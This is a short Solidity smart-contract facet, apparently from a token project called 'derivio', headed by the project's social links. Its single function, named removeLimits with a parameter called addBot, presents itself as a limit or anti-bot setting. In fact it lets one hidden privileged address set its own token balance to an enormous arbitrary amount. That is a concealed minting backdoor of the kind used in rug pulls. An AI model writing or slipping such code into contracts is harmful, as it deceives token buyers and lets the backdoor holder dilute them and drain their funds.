/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/derivio_xyz
    // Twitter: https://twitter.com/derivio_xyz
    // Website: https://derivio.xyz/
    // Medium:  https://medium.com/@derivio_xyz
    // Discord: https://discord.com/invite/vHNRygkwcw
    // Github:  https://github.com/derivio_xyz
*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
